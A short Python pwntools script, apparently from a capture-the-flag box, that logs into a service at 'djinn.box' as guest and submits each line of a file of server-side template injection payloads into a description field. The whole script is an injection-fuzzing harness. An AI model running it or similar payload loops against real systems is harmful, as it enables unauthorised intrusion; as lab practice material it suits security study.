#!/usr/bin/env python3

from pwn import *

host, port = 'djinn.box', 31337
s = remote(host, port)

s.recvuntil('username> ')
s.sendline('guest')

s.recvuntil('password> ')
s.sendline('guest')

with open('ssti-payloads.txt') as f:
    payloads = f.readlines()

for i, payload in enumerate(payloads):

    s.recvuntil('> ')
    s.sendline('open')

    s.recvuntil('Title: ')
    s.sendline('test{}'.format(i))

    s.recvuntil('Description: ')
    s.sendline('{}'.format(payload))

s.close()